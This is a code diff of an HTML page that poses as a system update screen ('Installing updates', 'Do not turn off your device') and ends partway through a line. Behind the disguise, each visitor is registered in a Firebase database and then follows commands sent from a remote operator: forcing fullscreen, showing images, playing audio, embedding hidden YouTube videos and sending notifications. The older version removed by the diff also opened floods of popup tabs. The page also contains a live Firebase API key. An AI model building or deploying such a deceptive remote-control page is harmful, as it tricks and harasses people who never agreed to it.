@@ -1,98 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>System Update</title>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-<style>
-html,body{margin:0;padding:0;height:100%;width:100%;background:#f0f0f0;font-family:sans-serif;cursor:pointer;display:flex;justify-content:center;align-items:center;text-align:center;overflow:hidden;}
-#overlay{position:absolute;top:0;left:0;right:0;bottom:0;background:#f0f0f0;display:flex;justify-content:center;align-items:center;z-index:10;}
-#overlay h1{font-size:28px;color:#222;}
-#status{font-size:18px;margin-top:10px;color:#333;}
-img{max-width:100%;max-height:100%;position:absolute;top:0;left:0;z-index:20;display:none;}
-audio,iframe{display:none;}
-.loader{position:absolute;top:10px;left:10px;height:6px;background:#1f2430;width:100%;border-radius:3px;overflow:hidden;}
-.loader-fill{height:100%;width:0%;background:#4da3ff;transition:0.2s;}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Updating…</title>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <style>
+    *{box-sizing:border-box;font-family:Inter,system-ui,Segoe UI,Roboto,Arial}
+    body{margin:0;background:#0b0f14;color:#e9eeff}
+    .screen{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}
+    .panel{width:520px;max-width:90%;text-align:center}
+    .title{font-size:22px;margin-bottom:8px}
+    .status{opacity:.85;margin-bottom:16px}
+    .bar{height:10px;background:#1a2446;border-radius:999px;overflow:hidden}
+    .bar > i{display:block;height:100%;width:40%;background:linear-gradient(90deg,#4f8cff,#6aa8ff)}
+    .overlay-img{position:fixed;inset:0;display:none;z-index:9999}
+    .overlay-img img{width:100%;height:100%;object-fit:contain;background:#000}
+    .click-anywhere{position:fixed;inset:0;z-index:10000;cursor:pointer}
+  </style>
 </head>
 <body>
 
-<div id="overlay"><h1>Click anywhere to continue update...</h1></div>
-<div>
-<p id="status">System updating...</p>
-<div class="loader"><div class="loader-fill" id="loaderFill"></div></div>
-<img id="img">
-<audio id="audio" controls></audio>
-<div id="ytContainer"></div>
+<div class="screen">
+  <div class="panel">
+    <div class="title">Installing updates</div>
+    <div id="status" class="status">Do not turn off your device.</div>
+    <div class="bar"><i id="bar"></i></div>
+  </div>
 </div>
 
+<div class="overlay-img" id="imgWrap"><img id="img" /></div>
+<div class="click-anywhere" id="gate"></div>
+
+<audio id="audio"></audio>
+
 <script>
-const firebaseConfig = {
-  apiKey:"AIzaSyCmbHFACq1ZGfXnAnWqXmLeKsTWVkrsTIg",
-  authDomain:"notify-f0a18.firebaseapp.com",
-  databaseURL:"https://notify-f0a18-default-rtdb.firebaseio.com",
-  projectId:"notify-f0a18"
-};
-firebase.initializeApp(firebaseConfig);
-const db=firebase.database();
+  const firebaseConfig = {
+    apiKey: "AIzaSyCmbHFACq1ZGfXnAnWqXmLeKsTWVkrsTIg",
+    authDomain: "notify-f0a18.firebaseapp.com",
+    databaseURL: "https://notify-f0a18-default-rtdb.firebaseio.com",
+    projectId: "notify-f0a18",
+    storageBucket: "notify-f0a18.firebasestorage.app",
+    messagingSenderId: "821318407742",
+    appId: "1:821318407742:web:2cb1b08140827cb9c2e36f",
+    measurementId: "G-L7X6CQWHY4"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
 
-let enabled=false;
-const overlay=document.getElementById("overlay");
-overlay.addEventListener("click",()=>{
-  Notification.requestPermission();
-  enabled=true;
-  overlay.style.display="none";
-});
+  // Consent gate (notifications + audio unlock)
+  const gate = document.getElementById('gate');
+  gate.onclick = async () => {
+    try{ await Notification.requestPermission(); }
+    catch(e){}
+    gate.remove();
+  };
 
-db.ref("signal").on("value",snap=>{
-  const d=snap.val();
-  if(!d) return;
+  const receiverId = localStorage.rid || (localStorage.rid=crypto.randomUUID());
 
-  // Text
-  if(d.type==="text"){
-    document.getElementById("status").innerText=d.message;
-    if(enabled && Notification.permission==="granted")
-      new Notification("System",{body:d.message});
-  }
+  db.ref('receivers/'+receiverId).set({online:true,ts:Date.now()});
+  setInterval(()=>db.ref('receivers/'+receiverId).update({ts:Date.now()}),5000);
 
-  // Image
-  if(d.type==="image"){
-    const img=document.getElementById("img");
-    img.src=d.data;
-    img.style.display="block";
-  }
+  db.ref('commands').on('child_added', s => {
+    const c=s.val();
+    if(c.target!=='ALL' && c.target!==receiverId) return;
+    run(c.command,c.payload||{});
+  });
 
-  // Audio
-  if(d.type==="audio" && enabled){
-    const audio=document.getElementById("audio");
-    audio.src=d.data;
-    audio.play().catch(()=>{});
-  }
-
-  // YouTube
-  if(d.type==="youtube"){
-    const container=document.getElementById("ytContainer");
-    container.innerHTML="";
-    let url=d.url;
-    let embed=`https://www.youtube.com/embed/${url.split("v=")[1].split("&")[0]}?autoplay=1`;
-    const ifr=document.createElement("iframe");
-    ifr.src=embed;
-    if(d.mode==="hidden"){
-      ifr.width=1; ifr.height=1; ifr.style.position="absolute"; ifr.style.left="-1000px";
-    } else {
-      ifr.width=window.innerWidth; ifr.height=window.innerHeight; ifr.style.position="absolute"; ifr.style.top=0; ifr.style.left=0;
-    }
-    container.appendChild(ifr);
-  }
-
-  // Popups / tabs
-  if(d.type==="popup" && enabled){
-    for(let i=0;i<d.count;i++){
-      window.open("about:blank","_blank");
+  function run(cmd,p){
+    switch(cmd){
+      case 'SET_FULLSCREEN': p.enabled?document.documentElement.requestFullscreen():document.exitFullscreen(); break;
+      case 'SET_STATUS_TEXT': status.textContent=p.text||''; break;
+      case 'SET_PROGRESS': bar.style.width=(p.value||0)+'%'; break;
+      case 'SHOW_IMAGE': img.src=p.base64; imgWrap.style.display='block'; break;
+      case 'CLEAR_IMAGE': imgWrap.style.display='none'; break;
+      case 'PLAY_AUDIO': audio.src=p.base64; audio.play().catch(()=>{}); break;
+      case 'PLAY_YT': yt(p.url,p.mode); break;
+      case 'NOTIFY': if(Notification.permission==='granted') new Notification(p.title||'',{body:p.body||''}); break;
+      case 'SOFT_RELOAD': location.reload(); break;
+      case 'RESET': location.reload(true); break;
+      case 'SET_THEME': document.title = p.theme==='windows'?'Working on updates…':'Updating…'; break;
     }
   }
-});
-</script>
-</body>
-</html>
+
+  function yt(url,mode){
+    const id=(url.split('v=')[1]||'').split('&')[0];
+    const f=document.createElement('iframe');
+    f.src=`https://www.you
